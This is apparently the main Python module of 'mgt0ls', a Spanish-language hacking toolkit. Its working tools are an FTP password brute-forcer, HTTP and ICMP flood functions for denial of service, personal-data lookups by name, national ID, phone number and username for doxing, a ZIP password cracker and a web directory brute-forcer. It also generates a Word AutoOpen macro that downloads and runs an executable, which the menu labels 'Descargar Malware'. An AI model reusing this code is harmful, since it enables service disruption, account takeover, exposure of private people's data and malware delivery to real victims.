import os
import json

# Verificacion de uso solamente en la carpeta instalada
try:
    with open(".root", "r", encoding="utf-8") as root_dir:
        root_json = json.load(root_dir)
        ROOT_MAX = root_json["root"]

        if "\\" in ROOT_MAX:
            ROOT_MAX = ROOT_MAX.replace("\\", "/")
        
        if "//" not in f"{ROOT_MAX}/":
            ROOT_MAX = ROOT_MAX + "/" # Cuando se use ROOT_MAX no hay que usar / porque ya lo tiene incluido

except:
    if "mgt0ls" in os.getcwd():
        print("[ERROR] setup.py Aun no ah sido ejecutado ...")
    else:
        print("[ERROR] No estas en la carpeta principal de mgt0ls ...")
    exit(0)

import sys
import time
import shutil
import codecs
import random
import base64
import asyncio
import paramiko
import pyzipper
import platform
import requests
import concurrent.futures
from sys import stdout
from bs4 import BeautifulSoup
from tabulate import tabulate
from hashlib import md5, sha1
from quopri import decodestring
from colorama import Fore, init
from subprocess import getoutput
from strgen import StringGenerator
from googletrans import Translator
from ftplib import FTP, error_perm, error_reply, error_temp

init(autoreset=True)

## Libs with error in linux

SYS_GLOBAL = platform.system().lower()

if "termux" not in ROOT_MAX: # SI NO ES TERMUX
    import aspose.words as aw

###################################################################
#                    USOS GENERALES DEL PROGRAMA                  #
###################################################################

def sht(path):   # Encargado de adaptar las rutas

    if "/" in path:
        check = os.path.join("a", "b")

        if "/" not in check: # Usa \
            path = path.replace("/", "\\")

    return path

def lang_cfg(lang):

    lang = lang.lower()
    with open(sht("assets/lang.cfg"), "r", encoding="utf-8") as verify, open(".root", "w", encoding="utf-8") as save_lang:

        verify_ = verify.read()

        if lang in verify_:
            root_json["lang"] = lang
            print(translate("[PASS] Has configurado tu idioma correctamente ..."))

        else:
            print(translate("[ERROR] No tenemos tu idioma en nuestro registro ..."))

        save_lang.write(str(root_json).replace("'", '"'))

async def translate_as(text):

    try:
        trans_ = Translator()

        if "win" in SYS_GLOBAL:
            try:
                detect_ = trans_.translate(text, dest=root_json["lang"], src="es")
            except:
                detect_ = await trans_.translate(text, dest=root_json["lang"], src="es")
        else:
            detect_ = await trans_.translate(text, dest=root_json["lang"], src="es") # Espera para poder retornar

        if "[" in detect_.text and "]" in detect_.text:
            txt = detect_.text.replace("[", f"{Fore.LIGHTBLACK_EX}[").replace("]", f"]{Fore.WHITE}") # Se repite

        return "\n"+txt
        
    except Exception as err:

        crint(f"[ERROR] {err}\n[AUTOCONFIG] Idioma reestablecido a: Spanish")
        root_json["lang"] = "es"
        with open(".root", "w", encoding="utf-8") as emergency_mod:
            emergency_mod.write(str(root_json).replace("'", '"'))

def translate(text):

    if root_json["lang"] == "es":
        if "[" in text and "]" in text:
            text = text.replace("[", f"{Fore.LIGHTBLACK_EX}[").replace("]", f"]{Fore.WHITE}") # Se repite

        return text
    else:
        return asyncio.run(translate_as(text)) # Ejecuta la tarea asyncrona para poder retornar

def crint(txt):

    if "[" in txt and "]" in txt:
        txt = txt.replace("[", f"{Fore.LIGHTBLACK_EX}[").replace("]", f"]{Fore.WHITE}") # Se repite
    
    print(txt)

def srint(txt):

    if "[" in txt and "]" in txt:
        txt = txt.replace("[", f"{Fore.LIGHTBLACK_EX}[").replace("]", f"]{Fore.WHITE}") # Se repite

    stdout.write("\r" + txt + "                     " + "\r")
    stdout.flush()

def update():

    try:
        with open("fsh.py", "r", encoding="utf-8") as check_lo:
            chek_vl = check_lo.read()
            chek_v = requests.get("https://raw.githubusercontent.com/IND4RKHK/mgt0ls/refs/heads/main/fsh.py")

            if chek_v.text != chek_vl:
                return "[UPDATE] MGT0L$ Tiene una nueva actualizacion disponible ..."
            else:
                return "[PASS] MGT0L$ Esta actualizado a su version mas reciente ..."
            
    except Exception as err:
        crint(f"[ERROR] {err}")

###################################################################
#                   HERRAMIENTAS DEL PROGRAMA                     #
###################################################################

def findperson(nombre, arg): # Funciona with
    
    if arg == None:
        arg = "ALL"
    
    nombre = f"{nombre} /{arg}"

    def limpieza(limp):

        limp=limp.replace('{"',"")
        limp=limp.replace('"}',"")
        limp=limp.replace(",", "\n")
        
        limp=limp.replace('":"',"===>")
        limp=limp.replace(" ","=")

        limp=limp.split()

        for palabra in limp:

            if len(palabra) < 80 and '>"' not in palabra and "code" not in palabra and "matches" not in palabra and "None" not in palabra and "time" not in palabra and "message" not in palabra:

                if "dv" in palabra:
                    palabra="\n[NEXT PERSON]\n"
                
                palabra=palabra.upper().replace("_"," ").replace('"',"").replace("===>",": ").replace("="," ").replace(":RUT","\nRUT")

                if "CONTENT:[]" in palabra:
                    crint("[ERROR] {} DNI No encontrada ...".format(nombre))

                else:
                    palabra = palabra.replace("CONTENT:",f"Posible coincidencia DNI de {nombre}: ").split("\n")
                    crint("[PASS] =>> "+palabra[0])
                break
                #print(palabra.upper().replace("_"," ").replace('"',"").replace("===>",": ").replace("="," ").replace(":RUT","\nRUT"))


    def geo():

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }


        data= {
            
            "value":"{}".format(nombre),
            "ab":"false",

            filter:{

                "personas":"true",
                "empresas":"true",
                "lugares":"true",
                "argentina":"true",
                "bolivia":"false",
                "chile":"false",
                "colombia":"false",
                "guatemala":"false",
                "mexico":"false",
                "venezuela":"false"

                }
            
            }

        buscador=requests.post("https://www.genealog.cl/Geneanexus/search", headers=headers, data=data)

        save=open("a.txt", "w")
        save.write(buscador.text)
        save.close()

        with open("a.txt", "r") as leer:

            for line in leer:

                if '{"' in line:
                    resultados=line.replace("var result = ", "")
                    #resultados_json=json.loads(resultados)

        os.remove("a.txt")

        crint(limpieza(resultados))


    ##### PRINCIPAL CODE

        #nombre_temp=""
    fi_update={}

    fi={
        "personas":"true",
        "empresas":"true",
        "lugares":"true",
        "argentina":"/A",
        "bolivia":"/B",
        "chile":"/C",
        "colombia":"/C",
        "guatemala":"/G",
        "mexico":"/M",
        "venezuela":"/V"
        }
    
    if "/ALL" in nombre.upper():
        todos="true"

        nombre=nombre.replace(" /ALL", "")

        for key in fi.keys():
            
            fi_update.setdefault(key,todos)
            fi.update(fi_update)
    else:

        for key in fi.keys():

            if key != "personas" and key != "empresas" and key != "lugares":

                if fi.get(key) in nombre.upper():
                    nombre_temp=nombre.replace(fi.get(key), "")

                    fi_update.setdefault(key,"true")    # DEPENDE DEL RESULTADO SE ACTUALIZA A TRUE O FALSE
                else:
                    fi_update.setdefault(key,"false")

        fi.update(fi_update)
        nombre=nombre_temp

    data= {
    
    "value":"{}".format(nombre),
    "ab":"false","filter":fi
    
    }

    try:
        geo()
    except Exception as err:
        crint(f"[ERROR] {err}")
        pass

def ftpbrute(selec, ftpserver, usuario, password): # Deberia funcionar with

    selec = selec.lower()

    def limpieza():

        if selec == "mul":

            usuarios=open(usuario)
            lec_usuarios=usuarios.read()

            if " " in lec_usuarios:
                lec_usuarios=lec_usuarios.replace(" ","\n")

            usu_save=open(".tempusu", "w")
            usu_save.write(lec_usuarios)

            usu_save.close()
            usuarios.close()

        passw=open(password)
        pass_lec=passw.read()

        if " " in pass_lec:
            pass_lec=pass_lec.replace(" ", "\n")
        
        pass_save=open(".temppass", "w")
        pass_save.write(pass_lec)

        pass_save.close()
        passw.close()

    def vector(usuario,password,ftpserver):

        try:
            with FTP(ftpserver) as conect:
                conect.login(user=usuario, passwd=password)
        #conect.login(user=usuario,passwd=password) # TimeoutError

        except TimeoutError:
            crint(f"[ERROR] Servidor no esta respondiendo en =>> [U]-{usuario}-[P]-{password}")
        except (error_temp, error_perm, error_reply):
            crint(f"[INFO] Usuario y contraseña erroneos =>> [U]-{usuario}-[P]-{password}")
        except Exception as err:
            crint(f"[ERROR] {err}")
        else:
            crint(f"[PASS] Usuario y contraseña correctos =>> [U]-{usuario}-[P]-{password}")
            exit(0)
            

    def ataque(usuario, ftpserver):

    
        if selec == "mul": # Ataque a multiples usuarios
            with open(".temppass", "r") as  lines_pass, open(".tempusu", "r") as lines:
                for usuario in lines:
                    usuario=usuario.strip()

                    for password in lines_pass:
                        password=password.strip()
                        vector(usuario,password,ftpserver)
                    lines_pass.seek(0)

        if selec == "one": # Un solo usuario
            with open(".temppass", "r") as  lines_pass:
                for password in lines_pass:

                    password=password.strip()
                    vector(usuario,password,ftpserver)
        
        crint("[ERROR] No se logro encontrar ninguna coincidencia ...")
                



    ######################################################################################

    #try:
    limpieza()
    crint(f"[INFO] Empezando ataque en =>> {ftpserver}")
    ataque(usuario, ftpserver)

    #except:
    #exit(0)

def httpflood(URL):

    def cookie_generator():

        global headers, cookies, cookie_pre
        AZAR=random.randint(1,10)

        cookie_pre=str(random.randint(9**100,9**101)).encode("utf-8") # (9**100.65,9**101.65)
        cookie_pre=base64.b64encode(cookie_pre*BYTESEND).decode("utf-8")

        #headers={"User-Agent":"{}".format(random_agents.get(AZAR))}
        headers={
            
            "User-Agent":f"{random_agents.get(AZAR)}",
            "Referer":f"https://www.{cookie_pre*BYTESEND}.com",
            "Cookie":f"{cookie_pre*BYTESEND}",
            "Authorization":f"{cookie_pre}",
            "Origin":f"{cookie_pre*BYTESEND}",
            "Cache-Control":"no-cache"

            }

        cookies={
            
            "{}".format(cookie_names.get(AZAR)):f"{cookie_pre}"

            }


    random_agents={

        1:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        2: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/12.34567",
        3: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
        4: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 YaBrowser/21.6.3.756 Yowser/2.5 Safari/537.36",
        5: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Whale/1.0.0.0 Safari/537.36",
        6: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 OPR/12.3456.7890 Safari/537.36",
        7: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Vivaldi/1.2.3.4 Safari/537.36",
        8: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Brave/9.8.7 Safari/537.36",
        9: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        10: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36"

    }

    cookie_names={

        1:"PHPSESSID",
        2:"JSESSIONID",
        3:"ga",
        4:"_gid",
        5:"_gat",
        6:"__cfduid",
        7:"__utmz",
        8:"cookieconsent_status",
        9:"csrftoken",
        10:"session-id"

    }

    BYTESEND=1
    status_max=200


    while True:

        try:
            while status_max == 200:
                cookie_generator()
                test=requests.get(URL, headers=headers, cookies=cookies) # UTILIZA POST SI ES VUL
                status_max=test.status_code
                crint("[INFO] Buscando peso de Payload =>> [{}] STATUS [{}]".format(BYTESEND,status_max))
                
                if status_max != 200:
                    BYTESEND=BYTESEND-1
                    proceso=cookie_pre*BYTESEND

                    proceso=sys.getsizeof(proceso)

                    terminal=1048576/proceso

                    crint(f"[INFO] Tamaño del Payload {round(proceso/1024,2)}KB =>> [200]\n[SET] En {round(terminal)} Solicitudes hay =>> 1MB")
                    time.sleep(5)
                else:
                    BYTESEND=BYTESEND+1

        except Exception as err:
            crint(f"[ERROR] {err}")
            exit(0)
        try:
            cookie_generator()
            atak=requests.get(URL, headers=headers, data=headers, cookies=cookies) # UTILIZA POST SI ES VUL
            
        except Exception as err:
            crint(f"[ERROR] {err}")
            exit(0)
        else:

            if atak.status_code != 200:
                crint("[INFO] URL =>> {} STATUS =>> [{}]".format(URL, atak.status_code))
            else:
                crint("[PASS] URL =>> {} STATUS =>> [{}]".format(URL, atak.status_code))

def icmpdos(ip, pack):

    if pack == None or int(pack) > 65500:
        crint("[ERROR] No has ingresado el tamaño de los paquetes correctamente ...")
        return
    
    pack = int(pack)
    crint("[INFO] Atacando =>> {} CON {}".format(ip,pack))

    try:
        if "win" in SYS_GLOBAL:
            os.system("ping -l {} -t {}".format(pack,ip))
        else:
            os.system("ping -s {} {}".format(pack,ip))
            
    except KeyboardInterrupt:
        crint(f"[INFO] Terminando ataque =>> [OK]")
        return
    except Exception as err:
        crint(f"[ERROR] {err}")
        return

def iplocate(ip):

    def limpieza(limp):

        limp=limp.replace('": {'," [BLOCK]\n")
        limp=limp.replace("{","")
        limp=limp.replace(",","")
        limp=limp.replace('"',"")
        limp=limp.replace("}","\n")
        limp=limp.replace("  ","")
        limp=limp.replace(":","->>")
        
        return limp.upper()

    headers={

        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",

    }

    try:
        localizando=requests.get(f"https://ipinfo.io/widget/demo/{ip}", headers=headers)
    except Exception as err:
        crint(f"[ERROR] {err}")
        pass
    else:
        print(limpieza(localizando.text))

def lopiapi(numero):

    def legible(json):
        
        
        if "," in json or "}" in json:
            
            
            json=json.replace("{","")
            json=json.replace("}","")
            json=json.replace(",","\n\n")
            json=json.replace('"','')
            json=json.replace("[", "")
            json=json.replace("]", "")
            json=json.upper()
            
            print("\n"+json)
            
        else:
            crint("[ERROR] Numero no encontrado ...")

    try:
        consulta=requests.get("https://api-lipiapp.lipigas.cl/wapi/no_auth/usuarios/terminos/{}".format(numero))
        
        consulta_n=requests.get("https://api-lipiapp.lipigas.cl/wapi/clientes?telefono={}&pais=cl&segmento=1".format(numero))
                            
        legible(consulta.text)
        legible(consulta_n.text)
    
    except Exception as err:
        crint(f"[ERROR] {err}")

def macromaker():

    def down():

        lec=macro_in_cache.replace("url_mgtols", rem)
        lec=lec.replace("archivo_mgtols", rem_2)

        escribe=open("macro.vb","w")
        escribe.write(lec)
        escribe.close()

        crint("[PASS] =>> MACRO.VB") 

        
    macro_in_cache="""
Sub AutoOpen()
    Dim url As String
    Dim destino As String
    Dim objShell As Object
    
    ' URL del archivo a descargar
    url = "url_mgtols"
    
    ' Ruta donde guardar el archivo (temporal en este caso)
    destino = Environ("TEMP") & "\\archivo_mgtols"
    
    ' Crear objeto Shell
    Set objShell = CreateObject("WScript.Shell")
    
    ' Descargar archivo
    Dim http As Object
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", url, False
    http.send
    
    ' Guardar archivo y ejecutarlo si se descargo correctamente
    If http.Status = 200 Then
        Open destino For Binary As #1
        Put #1, , http.responseBody
        Close #1
        objShell.Run destino
        Set objShell = Nothing
    Else
        Set objShell = Nothing
    End If
    
End Sub
    """


    try:
        
        selec=int(input("[01] Descargar Malware [02] Ejecutar Shell Commands ==> macr0mak3r>>"))

        while selec <= 0 or selec > 3:
            selec=int(input("[01] Descargar Malware [02] Ejecutar Shell Commands ==> macr0mak3r>>"))

    except:
        pass

    else:

        if selec == 1:

            try:
                rem=input("Introduce el enlace de tu archivo a descargar [URL/ARCHIVO.EXE]: ")
                
                while len(rem) == 0:
                    rem=input("Introduce el enlace de tu archivo a descargar [URL/ARCHIVO.EXE]: ")

                rem_2=input("Introduce el nombre de archivo [ARCHIVO.EXE]: ")

                while len(rem_2) == 0:
                    rem_2=input("Introduce el nombre de archivo [ARCHIVO.EXE]: ")


            except:
                pass
            else:
                try:
                    down()
                except Exception as err:
                    crint(f"[ERROR] {err}")
                    pass
        
        if selec == 2:
            crint("[INFO] Esta opcion esta en desarrollo ...")

def seeker(usuario): # Funciona with

    try:

        down_url = requests.get("https://raw.githubusercontent.com/IND4RKHK/mgt0ls/refs/heads/main/assets/url_dox.txt")

        with open(".bdd", "w", encoding="utf-8") as save_dw:
            save_dw.write(down_url.text)

    except Exception as err:

        crint(f"[ERROR] {err}")
        exit(0)
    

    status_codes = {

        200: "Posible Coincidencia",
        201: "Creado",
        202: "Aceptado",
        203: "Información no autorizada",
        204: "Sin contenido",
        205: "Restablecer contenido",
        206: "Contenido parcial",
        207: "Multi-estado",
        208: "Ya reportado",
        226: "IM utilizado",
        400: "Solicitud incorrecta",
        401: "No autorizado",
        402: "Pago requerido",
        403: "Prohibido",
        404: "No encontrado",
        405: "Método no permitido",
        406: "No aceptable",
        407: "Se requiere autenticación de proxy",
        408: "Tiempo de espera agotado",
        409: "Conflicto",
        410: "Recurso no disponible",
        411: "Longitud requerida",
        412: "Precondición fallida",
        413: "Carga útil demasiado grande",
        414: "URI demasiado larga",
        415: "Tipo de medio no soportado",
        416: "Rango no satisfactorio",
        417: "Expectativa fallida",
        418: "Soy una tetera",
        421: "Solicitud mal dirigida",
        422: "Entidad no procesable",
        423: "Bloqueado",
        424: "Dependencia fallida",
        425: "Demasiado pronto",
        426: "Se requiere actualización",
        428: "Requisito previo necesario",
        429: "Demasiadas solicitudes",
        431: "Campos de encabezado grandes",
        451: "No disponible por razones legales",
        500: "Error interno del servidor",
        501: "No implementado",
        502: "Puerta de enlace incorrecta",
        503: "Servicio no disponible",
        504: "Tiempo de espera agotado",
        505: "Versión HTTP no soportada",
        506: "La variante también negocia",
        507: "Almacenamiento insuficiente",
        508: "Bucle detectado",
        510: "No extendido",
        511: "Se requiere autenticación de red"

    }

    random_usera={

        1:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        2: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/12.34567",
        3: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
        4: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 YaBrowser/21.6.3.756 Yowser/2.5 Safari/537.36",
        5: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Whale/1.0.0.0 Safari/537.36",
        6: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 OPR/12.3456.7890 Safari/537.36",
        7: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Vivaldi/1.2.3.4 Safari/537.36",
        8: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Brave/9.8.7 Safari/537.36",
        9: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        10: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36"

    }

    headers= { # Especifica los valores necesarios para que get funcione correctamente
        
        "User-Agent": "{}".format(random_usera.get(random.randint(1,10))),
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Expires': '0'
        
    }

    def new_requests(url_list):

        url_list = url_list.strip().replace("name_find", usuario)
        # Intentamos obtener el codigo de respuesta del usuario
        try:
            my_query = requests.get(url_list, timeout=6)

            url_domain = url_list.replace("://", "<>").split("/")[0].replace("<>", "://")
            srint(f"[INFO] {status_codes.get(my_query.status_code)} en la URL =>> [{url_domain}]")

            # Si existe se retorna el url donde se obtuvo el enlace correcto           
            if my_query.status_code == 200 or "xbox" in my_query.url:
                return my_query.url

            # En caso de fallar o no encontrar nada se retorna Nulo
            return "Null"
        
        except KeyboardInterrupt:
            crint(f"[INFO] Escaneo cancelado ...")
            exit(0)

        except:
            return "Null"

    def buscador(usuario):

        crint("[INFO] Tipo de busqueda =>> [URL] to [{}]\n[Buscando en 800 <sitios>]".format(usuario))

        with open(".bdd", "r") as lectura, open("capture.txt", "w") as save:
            
            my_read_new = lectura.readlines()
            try:
                with concurrent.futures.ThreadPoolExecutor(max_workers=10) as thread_:
                    return_ = list(thread_.map(new_requests, my_read_new))

            except KeyboardInterrupt:
                save.close()
                crint(f"[INFO] Escaneo cancelado ...")
                exit(0)

            except:
                pass

            for url_return in return_:
                if "://" in url_return:
                    save.write("[URL] "+url_return+"\n")
                
        # Bloque de finalizaciont
        try:
            crint("\n[INFO] Siguiente busqueda en =>> [10 SEC]")
            time.sleep(10)
            siguiente()
        
        except KeyboardInterrupt:
            crint(f"[INFO] Escaneo cancelado ...")
            exit(0)

    def siguiente():
        crint("[INFO] Tipo de busqueda =>> [IN WEB] to [{}]".format(usuario))

        head_up={
            "User-Agent": "{}".format(random_usera.get(random.randint(1,10)))
            }
        
        headers.update(head_up)

        red=[]
        base="https://www.bing.com"
        busca= '/search?q="{}"'.format(usuario)

        try:
            dox=requests.get(base+busca, headers=headers)
            time.sleep(2)

        except:
            pass

        else:

            #save=open("capture.txt", "a")
            with open("capture.txt", "a") as save:

                sopa=BeautifulSoup(dox.text, "html.parser") # Obtengo la web en etiquetas
                
                for word in sopa.find_all("a"): # Busco parametros <a en sopa

                    palabra=str(word.get("href")) # Obtengo la etiqueta especifica href

                    if "https://" in palabra:
                        srint("[URL] {} =>> [{}]".format(palabra,status_codes.get(dox.status_code)))
                        save.write("[URL] {}\n".format(palabra))
                    
                    if "first=" in palabra:
                        red.append(palabra)
                
                for word in red:

                    try:
                        dox=requests.get(base+word, headers=headers)
                        time.sleep(2) # SI SE DESCOMENTA, NO SE ALCANZA A LEER COMPLETA LA PAGINA /ALL time.sleep
                    except:
                        pass
                    
                    else:
                        sopa=BeautifulSoup(dox.text, "html.parser")
                        
                        for word_soup in sopa.find_all("a"):

                            palabra=str(word_soup.get("href"))

                            if "https://" in palabra:
                                srint("[URL] {} =>> [{}]".format(palabra,status_codes.get(dox.status_code)))
                                save.write("[URL] {}\n".format(palabra)) ##########################

            crint("[INFO] Datos de {} guardados en capture.txt ...".format(usuario))
            exit(0)

    buscador(usuario)

def tempmail(correo, selec):

    MAIL="https://mailnesia.com/mailbox/"
    mail_complemento="https://mailnesia.com"


    def limpieza(limp):
        
        limp=limp.replace("\n\n","\n")
        limp=limp.replace("\n\n\n\n\n\n","\n")
        limp=limp.replace("\n\n","\n")

        temp=open(".temp", "w", encoding="utf-8")
        temp.write(limp)
        temp.close()

        temp=open(".temp", encoding="utf-8")
        lectura=temp.readlines()

        temp_2=open(".temp_2", "w", encoding="utf-8")
        for line in lectura:

            if "https://" in line or "·" in line or "на русском языке" in line:
                ok=False
            else:
                temp_2.write(line)
        
        temp_2.close()
        temp.close()

        limp=open(".temp_2", encoding="utf-8")
        limp=limp.read()

        return limp


    try:
        solicitud=requests.get(MAIL+correo)
    
    except:
        pass

    else:
        push=0
        check=[]
        check_final={}
        check_str=None

        sopa=BeautifulSoup(solicitud.text, "html.parser")

        for link in sopa.find_all("a"):

            bandeja=str(link.get("href"))
            
            if correo+"/" in bandeja:
                check.append(bandeja)
        try:
            for link in check:

                if link != check_str:

                    push+=1
                    check_str=link
                    check_final.setdefault(push,mail_complemento+link)
        except:
            pass
        else:
            crint("[PASS] Correo {}@mailnesia.com =>> [LISTO PARA USAR] =>> [INFO] Mensajes: [{}]".format(correo, push))

            if push > 0 and selec != None:
                
                selec = int(selec)

                get_mensaje=requests.get(check_final.get(selec))
                sopa=BeautifulSoup(get_mensaje.text, "html.parser")

                print(limpieza(sopa.get_text()))
                crint("[INFO] =>> {}".format(check_final.get(selec)))             

def unzipper(dic, directiorio_archivo): # Funciona with

    def limpieza():

        limp=open(dic)
        esp=limp.read()

        abrir=open(".bbd", "w")

        if " " in esp:

            esp=esp.replace(" ","\n")

        
        abrir.write(esp)
        
        abrir.close()
        limp.close()

    def crack():
        with open(".bbd", "r") as linea: 
            with pyzipper.AESZipFile(directiorio_archivo, "r") as filesx:  # Cambiamos a AESZipFile para soportar cifrado avanzado
                for password in linea:
                    password = password.strip()  # Limpia espacios y saltos de línea
                    
                    try:
                        # Intenta extraer usando la contraseña
                        filesx.extractall("unzipper/", pwd=password.encode("utf-8"))
                        crint(f"[PASS] Contraseña encontrada: {password}")
                        #exit(0)  # Sale de la función si la contraseña es correcta
                    except:
                        crint(f"[ERROR] Contraseña incorrecta: {password}")

    try:
        limpieza()
    except:
        crint("[ERROR] Diccionario no existente ...")
        pass
    
    try:
        crack()
    except NotImplementedError:
        crint("[ERROR] Formato de compresion no soportado ...")
    except FileNotFoundError:
        crint("[ERROR] Archivo dañado o no existente ...")
    except:
        pass

def webdumper(select, url, dic_path): # Funciona with

    select = select.lower()

    random_usera={

        1:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        2: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/12.34567",
        3: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
        4: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 YaBrowser/21.6.3.756 Yowser/2.5 Safari/537.36",
        5: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Whale/1.0.0.0 Safari/537.36",
        6: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 OPR/12.3456.7890 Safari/537.36",
        7: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Vivaldi/1.2.3.4 Safari/537.36",
        8: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Brave/9.8.7 Safari/537.36",
        9: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
        10: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36"

    }


    getted = []
    extensiones_comunes = [".php", ".html", ".asp", ".aspx", ".jsp", ".cgi", ".pl"]

    def get_dic(enlace, nombre):

        try:

            dic_down = requests.get(enlace)

            archivo_dic = open(nombre, "w")
            archivo_dic.write(dic_down.text)
            archivo_dic.close()

        except Exception as err:
            crint(f"[ERROR] {err}")

    def inicial_find(url, dic_path):

        #dict = open(dic_path, "r")
        #dict_line = dict.readlines()
        
        if f"/test_script" not in f"{url}test_script": # Chekea si tiene una / al final para los directorios
            url = url + "/"

        with open(dic_path, "r") as dict_line:

            for palabra in dict_line:

                palabra = palabra.replace("\n", "").strip(" ")
                url_100 = f"{url}{palabra}"

                if "//" in url_100:
                    url_100 = url_100.replace("//", "/")
                    url_100 = url_100.replace(":/", "://")
                
                headers = { # Especifica los valores necesarios para que get funcione correctamente
                    
                    "User-Agent": "{}".format(random_usera.get(random.randint(1,10))),
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'Expires': '0'
                    
                }

                finder = requests.get(url_100, headers=headers, timeout=8)

                if finder.status_code == 200 or finder.status_code == 403:

                    if finder.status_code == 403:
                        sig = "PROTEGIDO"
                    elif finder.status_code == 200:
                        sig = "ENCONTRADO"

                    if url_100 != url and [url_100, finder.status_code, sig] not in getted:
                        getted.append([url_100, finder.status_code, sig]) # Se agrega a la variable si se encuentra algo funcional

                crint(f"[INFO] {url_100} =>> {finder.status_code}")

    def recursive_find(dic_path, tipo):

        if getted != []:

            if tipo == "path":
                for url in getted:
                    if not any(ext in url[0] for ext in extensiones_comunes):
                        crint(f"|----CHECKING-->> [{url[0]}] <<--CHECKING----|")
                        inicial_find(url[0], dic_path)
            
            elif tipo == "arch":
                for url in getted:
                    if not any(ext in url[0] for ext in extensiones_comunes):
                        crint(f"|----CHECKING-->> [{url[0]}] <<--CHECKING----|")
                        inicial_find(url[0], dic_path)


    try:

        get_dic("https://raw.githubusercontent.com/IND4RKHK/mgt0ls/refs/heads/main/assets/path.txt", "path.txt")
        get_dic("https://raw.githubusercontent.com/IND4RKHK/mgt0ls/refs/heads/main/assets/arch.txt", "arch.txt")

        if select == "f":
            if dic_path == None:
                dic_path = "path.txt" # Ubicacion del script base
            inicial_find(url, dic_path) # Obtiene los directorios ocultos
        elif select == "s": 
            inicial_find(url, "path.txt") # Obtiene los enlaces disponibles 

            recursive_find("path.txt", "path") # Luego intenta con los sub enlaces de esos mismos
            recursive_find("arch.txt", "arch")

        print("\n")
        
        if getted != []:
            print(tabulate(getted, headers=["DIRECTORIOS ENCONTRADOS", "CODIGO", "ESTADO"], tablefmt="simple"))
        else:
            crint("[ERROR] No se han encontrado directorios ocultos ...")
            
    except KeyboardInterrupt:
        print("\n")
